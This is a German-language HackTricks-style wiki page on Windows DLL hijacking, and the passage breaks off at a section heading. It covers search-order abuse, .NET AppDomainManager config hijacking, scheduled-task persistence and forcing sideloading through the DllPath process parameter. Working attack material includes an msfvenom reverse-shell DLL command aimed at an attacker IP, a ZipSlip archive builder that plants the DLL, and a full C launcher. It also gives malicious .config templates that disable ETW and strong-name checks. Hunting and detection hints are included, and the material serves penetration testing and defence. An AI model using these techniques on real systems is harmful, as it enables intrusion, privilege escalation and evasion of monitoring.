# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Bei DLL Hijacking wird eine vertrauenswürdige Anwendung dazu gebracht, eine bösartige DLL zu laden. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Diese werden hauptsächlich für Code Execution und Persistence sowie seltener für Privilege Escalation eingesetzt. Obwohl hier der Fokus auf der Rechteausweitung liegt, bleibt die Hijacking-Methode unabhängig vom Ziel dieselbe.

### Gängige Techniken

Für DLL Hijacking werden verschiedene Methoden eingesetzt. Wie effektiv sie sind, hängt von der DLL-Ladestrategie der Anwendung ab:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine echte DLL wird durch eine bösartige ersetzt. Optional kann DLL Proxying verwendet werden, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Die bösartige DLL wird in einem Suchpfad vor der legitimen platziert. Dabei wird das Suchmuster der Anwendung ausgenutzt.
3. **Phantom DLL Hijacking**: Für eine Anwendung wird eine bösartige DLL erstellt, die sie lädt, weil sie sie für eine benötigte, aber nicht vorhandene DLL hält.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder `.exe.manifest`- / `.exe.local`-Dateien werden geändert, um die Anwendung zur bösartigen DLL umzuleiten.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch ein bösartiges Gegenstück ersetzt. Diese Methode wird häufig mit DLL side-loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die bösartige DLL wird zusammen mit der kopierten Anwendung in einem vom Benutzer kontrollierten Verzeichnis platziert. Das ähnelt Binary Proxy Execution-Techniken.

Eine Anwendung kann auch einen **eigenen DLL-Loader** implementieren. Ein privilegierter Prozess kann ein Unterverzeichnis wie `Libraries` oder `Plugins` auflisten und eine ausgewählte DLL an einen Helper übergeben, unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien in genau diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine Überprüfung dienen: Bestätigen Sie die Prozessidentität, die effektiven ACLs des Verzeichnisses, die Dateiauswahlregel und einen erreichbaren Ladevorgang. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + Angreifer-Assembly)

Klassisches DLL sideloading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Angreifercode zu laden. Wenn es sich beim Zielprogramm um eine **verwaltete** Anwendung handelt, prüft die CLR auch eine nach der ausführbaren Datei benannte **Anwendungskonfigurationsdatei** (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** festgelegt werden. Verweist die Konfiguration auf eine vom Angreifer kontrollierte Assembly neben der EXE, lädt die CLR diese **vor dem normalen Codepfad der Anwendung** und führt sie im vertrauenswürdigen Prozess aus.<sup>[[24]](#references)</sup>

Laut dem Konfigurationsschema für .NET Framework von Microsoft müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Dieses **.NET Framework-spezifische** Tradecraft hängt von der CLR-Konfigurationsanalyse ab, nicht von der Win32-DLL-Suchreihenfolge.
- Der Host muss tatsächlich eine **managed EXE** sein. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder in den PE-Metadaten nach dem **CLR Runtime Header** suchen.
- Der Name der Konfigurationsdatei muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und sie befindet sich normalerweise **neben der EXE**.
- Das ist bei **signierten Microsoft-/Vendor-Binärdateien** nützlich, weil die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed Assembly im selben Prozess ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installations-/Update-Verzeichnis verfügst, kann AppDomainManager-Hijacking als **erste Stufe** verwendet werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader + Bootstrap für geplante Tasks

Ein praktisches Intrusion-Muster besteht darin, die vertrauenswürdige managed EXE mit einer bösartigen `*.config` und einer bösartigen AppDomainManager-DLL zu kombinieren, die nur als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Der Benutzer startet ein signiertes .NET-Installationsprogramm oder einen Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die benachbarte Konfigurationsdatei veranlasst die CLR, die Assembly des Angreifers zu laden, **bevor** die Logik der legitimen App startet.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die zweite Stufe nur aus `%LOCALAPPDATA%` starten lassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen vom Benutzer beschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet Persistenz mit einem geplanten Task ein.

Warum diese Variante wichtig ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, bei der nur die Hauptdatei gehasht wird, die Kompromittierung möglicherweise übersieht.
- Einfache **pfadbasierte Anti-Analyse** ist verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, in den Temp-Ordner oder in einen Sandbox-Pfad kann die Kette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später heruntergeladen wird.

Minimales Persistenzbeispiel, das häufig bei diesem Muster zu sehen ist:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` bedeutet **höchste verfügbare Berechtigung** für diesen Benutzer/diese Sitzung; allein dadurch ist keine garantierte SYSTEM-Eskalation gegeben.
- Diese Technik lässt sich oft besser als **Ausführung/Persistenz durch .NET-Config-Missbrauch** einordnen denn als klassisches Hijacking der DLL-Suchreihenfolge aufgrund einer fehlenden DLL, auch wenn Operatoren beides häufig kombinieren.

Erkennungshinweise:
- Signierte .NET-Executables, die aus **ZIP-Entpackpfaden**, `Downloads`, `%TEMP%` oder anderen benutzerbeschreibbaren Ordnern gestartet werden und eine **danebenliegende** `<exe>.config` haben.
- Neue geplante Aufgaben, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser- oder Anbieter-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, sofern der Pfad der Executable nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking einer vorhandenen geplanten Aufgabe, um die Sideload-Kette erneut zu starten

Für Persistenz sollte man nicht nur nach dem **Erstellen einer neuen Aufgabe** suchen. Manche Intrusion-Sets warten, bis ein legitimer Installer eine **normale Updater-Aufgabe** erstellt, und schreiben dann die **Aufgabenaktion um**, sodass Name, Autor und Trigger den Verteidigern vertraut bleiben.

Wiederverwendbarer Workflow:
1. Installiere/führe die legitime Software aus und ermittle die Aufgabe, die sie normalerweise erstellt.
2. Exportiere das Aufgaben-XML und notiere die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetze nur die Aktion, sodass die Aufgabe deine **vertrauenswürdige Host-EXE** aus einem benutzerbeschreibbaren Staging-Verzeichnis startet, die dann die echte Payload per Side-Loading oder AppDomain lädt.
4. Registriere denselben Aufgabennamen erneut, statt ein neues, offensichtliches Persistenz-Artefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (zum Beispiel wie der eines Anbieter-Updaters).
- Der **Task Scheduler-Dienst** startet die Aufgabe. Daher sieht die Validierung von Eltern- und Vorfahrenprozessen oft die erwartete Planungskette statt `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits vorhanden war, deren Aktion nun aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Hunting-Ansatzpunkte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erstelle einen Alert, wenn eine **wie ein Anbieter-Updater wirkende Aufgabe** aus **vom Benutzer beschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine schrittweise Angriffskette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL-Sideloading kombiniert, findest du im folgenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die folgenden 2 Filter einzustellen**:

![Allgemeine Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon von Sysinternals auszuführen und die folgenden 2 Filter einzustellen](<../../../images/image (961).png>)

![Allgemeine Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon von Sysinternals auszuführen und die folgenden 2 Filter einzustellen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Allgemeine Techniken – Fehlende DLLs finden: und nur die File System Activity anzuzeigen](<../../../images/image (153).png>)

Wenn du **allgemein nach fehlenden DLLs** suchst, **lässt** du Procmon einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchst, setze einen weiteren Filter wie **"Process Name" "contains" `<exec name>`**, führe die Datei aus und stoppe die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um Berechtigungen zu erweitern, suche nach einer **DLL, die ein privilegierter Prozess zu laden versucht** und in ein Verzeichnis geschrieben werden kann, auf das du Schreibzugriff hast. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du genau beschrieben, wie DLLs geladen werden.**

**Windows-Anwendungen** suchen DLLs anhand einer Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge. DLL-Hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse abgelegt wird, sodass sie vor der authentischen DLL geladen wird. Eine Möglichkeit, dies zu verhindern, ist, dafür zu sorgen, dass die Anwendung absolute Pfade für die benötigten DLLs verwendet.

Die **DLL-Suchreihenfolge auf 32-Bit**-Systemen sieht wie folgt aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der Umgebungsvariable PATH aufgeführt sind. Beachte, dass der anwendungsspezifische Pfad, der im Registrierungsschlüssel **App Paths** angegeben ist, nicht dazugehört. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Dies ist die **Standard**-Suchreihenfolge, wenn **SafeDllSearchMode** aktiviert ist. Ist die Funktion deaktiviert, rückt das aktuelle Verzeichnis an die zweite Stelle. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig ist die Funktion aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Eine DLL kann schließlich auch über ihren absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows die DLL selbst nur an diesem Pfad. Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erläutern.

### Eine beliebige Dateischreibmöglichkeit zu einem Missing-DLL-Hijack verketten

**Verwandte Technik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu erfassen, nach denen der Prozess sucht, die er aber nicht finden kann.<sup>[[14]](#references)</sup>
2. Wird die Binärdatei **per Zeitplan oder als Dienst** ausgeführt, wird eine DLL mit einem dieser Namen im **Anwendungsverzeichnis** (Eintrag Nr. 1 der Suchreihenfolge) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn deine Primitive ein **ZipSlip-artiger beliebiger Schreibzugriff** ist, erstelle ein ZIP-Archiv, dessen Eintrag aus dem Extraktionsverzeichnis ausbricht, sodass die DLL im Anwendungsverzeichnis landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Stelle das Archiv im überwachten Inbox-/Share-Verzeichnis bereit; wenn die geplante Aufgabe den Prozess erneut startet, lädt dieser die bösartige DLL und führt deinen Code als Dienstkonto aus.

### Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Wenn du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (kein absoluter Pfad und keine sicheren Ladeoptionen), dazu gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Ziel-Binärdatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So wird zuverlässiges Sideloading ermöglicht, selbst wenn sich die bösartige DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies betrifft den zu erstellenden Kindprozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder LoadLibrary aufrufen (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht gehijackt werden. Weitergeleitete Exporte und SxS können die Reihenfolge der Pfadauflösung verändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Beispiel zur operativen Verwendung
- Platziere eine schädliche xmllite.dll (die erforderlichen Funktionen exportierend oder als Proxy zur echten DLL) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binärdatei, von der bekannt ist, dass sie mit der oben beschriebenen Technik xmllite.dll anhand des Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und lädt deine DLL per Sideloading.

Diese Technik wurde in freier Wildbahn dazu beobachtet, mehrstufige Sideloading-Ketten anzustoßen: Ein initialer Launcher legt eine Hilfs-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binärdatei mit einem benutzerdefinierten DllPath startet, um das Laden der Angreifer-DLL aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking über `.exe.config`

Bei **.NET Framework**-Zielen kann Sideloading **vor `Main()`** erfolgen, ohne den Speicher zu patchen, indem die benachbarte **`.exe.config`**-Datei der Anwendung missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer schädlichen Konfigurationsdatei und einer oder mehreren vom Angreifer kontrollierten Assemblys.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE startet und die **CLR liest `<exe>.config`**.
2. Die Konfiguration setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, sodass die Laufzeitumgebung einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der schädliche Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Konfiguration kann die CLR dazu zwingen, zuerst lokale Assemblys aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) und die Laufzeitvalidierung/-telemetrie ohne Inline-Patching abzuschwächen.

Kampagnenartiges Muster (die genaue Verschachtelung kann je nach Direktive/CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum dies nützlich ist:
- **`<probing privatePath="."/>`** hält die Assembly-Auflösung im Anwendungsverzeichnis und macht den Ordner zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifercode, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann es einer Full-Trust-Anwendung ermöglichen, unsignierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert Publisher-Policy-Umleitungen zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** macht die Runtime-Auswahl deterministischer.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit über die Konfiguration deaktiviert**, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In jüngeren Kampagnen beobachtetes Vorgehen:
- Phase 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Phase 2 kopiert sie in einen glaubwürdig wirkenden **AppData update**-Ordner, benennt den Host in etwa in `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Phase 3 überprüft den Ausführungskontext (zum Beispiel, ob der erwartete übergeordnete Prozess `svchost.exe` von Task Scheduler ist), bevor die finale RAT-DLL/der finale Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET- ausführbare Dateien**, die mit verdächtigen benachbarten **`.config`**-Dateien an benutzerschreibbaren Speicherorten ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binärdateien aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Übergeordnete-/untergeordnete Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der sofort Assemblies von Nicht-Herstellern aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge aufgeführt:

- Wenn eine **DLL gefunden wird, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es zunächst auf eine Umleitung und ein Manifest, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt, verwendet das System die Version dieser bekannten DLL zusammen mit allen abhängigen DLLs, **ohne den Suchvorgang durchzuführen**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- **Hat eine DLL Abhängigkeiten**, werden diese abhängigen DLLs so gesucht, als wären sie nur durch ihre **Modulnamen** angegeben worden – unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Privilegien** ausgeführt wird oder ausgeführt werden soll (horizontale Bewegung oder lateral movement) und dem eine **DLL fehlt**.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten: Bei privilegierten ausführbaren Dateien fehlen normalerweise keine DLL-Abhängigkeiten, und Standardbenutzer können normalerweise nicht in Systempfadverzeichnisse schreiben. Fehlkonfigurierte Umgebungen können dennoch beide Bedingungen erfüllen.\
Wenn die Voraussetzungen erfüllt sind, sieh dir das Projekt [UACME](https://github.com/hfiref0x/UACME) an. Obwohl dessen Hauptziel der UAC-Bypass ist, enthält es DLL-Hijacking-PoCs für bestimmte Windows-Versionen, die sich oft an das gefundene beschreibbare Verzeichnis anpassen lassen.

Beachte, dass du deine **Berechtigungen in einem Ordner überprüfen** kannst mit:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL mit Folgendem überprüfen:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie du **DLL Hijacking missbrauchen kannst, um deine Berechtigungen zu erweitern**, wenn du Schreibrechte in einem **System-Path-Ordner** hast, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte für einen Ordner innerhalb des System-PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu finden, sind **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist es für eine erfolgreiche Ausnutzung besonders wichtig, eine DLL zu **erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei aus ihr importiert**. Beachte außerdem, dass DLL Hijacking nützlich ist, um von einer mittleren Integritätsstufe auf eine hohe **(UAC zu umgehen)** [zu wechseln](../../authentication-credentials-uac-and-efs/index.html#uac) oder von [**hoher Integrität zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie du eine gültige DLL erstellst**, findest du in dieser Studie zu DLL Hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Im **nächsten Abschnitt** findest du außerdem einige **einfache DLL-Codes**, die als **Vorlagen** nützlich sein oder zum Erstellen einer **DLL mit exportierten, nicht erforderlichen Funktionen** dienen können.

## **DLLs erstellen und kompilieren**

### **DLL proxifizieren**

